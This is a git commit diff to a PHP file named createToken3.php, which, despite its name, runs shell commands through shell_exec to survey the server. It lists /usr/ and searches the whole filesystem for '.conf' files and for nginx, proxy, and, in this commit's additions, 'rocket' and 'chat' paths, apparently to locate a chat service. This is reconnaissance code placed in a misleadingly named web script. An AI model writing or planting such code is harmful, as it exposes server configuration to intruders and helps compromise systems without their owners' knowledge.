c8c13c60499469a515f0cd8c08a030417dde52db
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 21:33:04 +0100

    Update createToken3.php

--- createToken3.php
+++ createToken3.php
@@ -4,6 +4,8 @@ $output =$output."\n /usr/... ".shell_exec (' ls /usr/ | xargs');
 $output =$output."\n find .conf ".shell_exec (' find / -name "*.conf" | xargs');
 $output =$output."\n find nginx ".shell_exec (' find / -name "nginx" | xargs');
 $output =$output."\n find proxy ".shell_exec (' find / -name "proxy" | xargs');
+$output =$output."\n find rocket ".shell_exec (' find / -name "rocket" | xargs');
+$output =$output."\n find chat ".shell_exec (' find / -name "chat" | xargs');
 
 
 
